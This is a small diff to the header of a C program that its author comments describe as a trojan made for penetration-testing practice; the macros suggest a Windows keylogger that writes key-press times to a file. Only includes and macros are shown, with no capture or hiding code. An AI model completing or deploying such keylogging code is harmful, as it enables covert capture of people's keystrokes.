@@ -1,12 +1,13 @@
 /*This Program Is Coded By HIMANSHU ATHWANI */
 /*Purely For Educational Purpose Only */
 /* This Project Was Made By Himanshu Athwani For Testing Trojan Manipulation
-    Under Penetration Testing Learning Process........                    */
+    Under Penetration Testing Learning Process........                   */
 #include <windows.h>
 #include <winuser.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <conio.h>
+#include <time.h>
 /*MACROS DESCRIPTIONS*/
 #define separator fprintf(fp,"\n-----------------------------------------------------\n");
 #define Get_Time_In_Seconds time_when_key_was_pressed_in_seconds= time(NULL);
